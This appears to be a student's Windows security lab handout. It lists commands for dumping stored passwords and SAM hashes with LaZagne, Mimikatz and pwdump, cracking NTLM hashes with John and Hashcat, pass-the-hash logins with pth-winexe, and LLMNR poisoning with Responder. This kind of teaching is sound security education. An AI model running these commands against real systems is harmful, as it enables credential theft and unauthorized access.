# Day 8 – Windows Hacking (Authorized Security Testing)

> **Disclaimer**
>
> This documentation is intended for **educational purposes** and should only be used in **authorized environments**, such as personal labs, CTFs, or systems where you have explicit permission to perform security testing.

---

# Topics Covered

* Windows User Management
* Windows Authentication
* Password Hash Extraction
* Credential Dumping Tools
* NTLM Hash Cracking
* Pass-the-Hash Authentication
* LLMNR/NBT-NS Poisoning using Responder

---

# Windows Authentication

Windows primarily uses **Kerberos** for authentication in Active Directory environments.

## Password Storage

Windows stores local account password hashes in the **Security Account Manager (SAM)** database.

* SAM = Security Account Manager
* Stores password hashes (not plaintext passwords)
* Used for local account authentication

#

---

# Change Password Using Command Prompt

Reset a local user's password:

```cmd
net user username 12345
```

Example:

```cmd
net user student Password@123
```

---

# LaZagne

LaZagne is an open-source credential recovery tool that can recover passwords stored on a Windows system.

Common modules include:

* Browser passwords
* Wi-Fi passwords
* Mail clients
* Databases
* FTP clients

Run Command Prompt as Administrator.

### Dump All Credentials

```cmd
lazagne.exe all
```

### Browser Passwords

```cmd
lazagne.exe browsers
```

### Wi-Fi Passwords

```cmd
lazagne.exe wifi
```

---

# Mimikatz

Mimikatz is a post-exploitation tool used for credential extraction and security research.

### Enable Debug Privilege

```text
privilege::debug
```

### Dump Logon Credentials

```text
sekurlsa::logonpasswords
```

This may display:

* Username
* Domain
* NTLM Hash
* Kerberos Tickets
* Cached Credentials

---

# WCE (Windows Credentials Editor)

WCE is a credential extraction utility capable of interacting with Windows authentication mechanisms during authorized security assessments.

Display Help
wce.exe -?

or

wce.exe /?

---

# pwdump

Pwdump extracts password hashes from the Windows SAM database.

Example:

```cmd
pwdump7.exe > hashes.txt
```

The output file contains password hashes that can later be analyzed in a lab environment.

---

# John the Ripper

John the Ripper is used to crack password hashes using dictionaries or brute-force attacks.

### Crack NT Hashes

```bash
john --wordlist=rockyou.txt --format=NT hashes.txt
```

### Display Cracked Passwords

```bash
john --show --format=NT hashes.txt
```

Supported hash formats include:

* NT
* LM
* MD5
* SHA1
* SHA256
* bcrypt

---

# Hashcat

Hashcat is a GPU-accelerated password recovery tool capable of cracking numerous hash formats.

Typical workflow:

1. Obtain password hashes.
2. Identify the hash type.
3. Select the appropriate Hashcat mode.
4. Run dictionary or mask attacks.
5. Review recovered passwords.


Crack an NTLM Hash Using a Wordlist
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

Crack an LM Hash
hashcat -m 3000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

---

# Pass-the-Hash (PtH)

Pass-the-Hash allows authentication using an NTLM hash instead of the plaintext password during authorized security testing.

Example syntax:

```bash
pth-winexe -U 'Administrator%LMHASH:NTHASH' //TARGET_IP cmd.exe
```

Example:

```bash
pth-winexe -U 'Admin%6B664D89FBDCEF4D3B23F8B9F75C1729:B3A13D95571B71E8903973E0D98406DF' //10.0.2.15 cmd.exe
```

> Perform Pass-the-Hash only on systems where you have explicit authorization.

---

# Responder

Responder is a network assessment tool that listens for and responds to broadcast name-resolution requests (such as LLMNR and NBT-NS) during authorized internal security assessments.

Example:

```bash
sudo responder -I eth0
```

Common use cases include:

* Internal network assessments
* Demonstrating insecure name resolution
* Capturing authentication attempts in controlled environments

---

# Tools Covered

| Tool            | Purpose                                               |
| --------------- | ----------------------------------------------------- |
| LaZagne         | Recover stored credentials                            |
| Mimikatz        | Extract credentials and Kerberos information          |
| WCE             | Windows credential utility                            |
| pwdump          | Dump password hashes from SAM                         |
| John the Ripper | Password hash cracking                                |
| Hashcat         | GPU-based password recovery                           |
| Responder       | Network credential capture in authorized environments |

---

# Learning Objectives

By completing this lab, you should understand:

* Windows authentication basics
* Kerberos authentication
* Security Account Manager (SAM)
* Local user administration
* Password hash extraction concepts
* NTLM vs LM hashes
* Password recovery techniques
* Pass-the-Hash concept
* Internal network credential attacks
* Defensive awareness for Windows environments

---

## References

* Microsoft Windows Security Documentation
* MIT Kerberos Documentation
* John the Ripper Documentation
* Hashcat Documentation
* LaZagne GitHub Repository
* Mimikatz Project
* Responder Project

---

**Author:** Shlok Kaneriya
**Topic:** Windows Hacking Fundamentals (Authorized Security Testing)
